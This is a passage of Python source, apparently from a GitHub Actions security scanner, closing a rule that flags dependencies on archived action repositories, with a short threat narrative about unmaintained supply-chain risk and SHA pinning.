        reference="https://docs.github.com/en/repositories/archiving-a-github-repository/archiving-repositories",
        test_positive=[],
        test_negative=[
            # When the flag is disabled (the default), the pattern
            # returns [] and no positives are needed.
        ],
        stride=["T", "I"],
        threat_narrative=(
            "Archived action repositories are abandoned supply-chain "
            "surface.  When a CVE is published against an archived "
            "action, the disclosure-to-patch interval is unbounded — "
            "no maintainer is on the other end to triage.  An attacker "
            "with the dormant maintainer account can publish a new "
            "tag that downstream consumers will silently pick up if "
            "they aren't SHA-pinned; the archived flag prevents the "
            "owner from accepting external PRs but doesn't prevent the "
            "owner themselves from pushing fresh content.  Migrating "
            "off archived dependencies is the cheapest mitigation."
        ),
        finding_family="action_pin_drift",
    ),
]
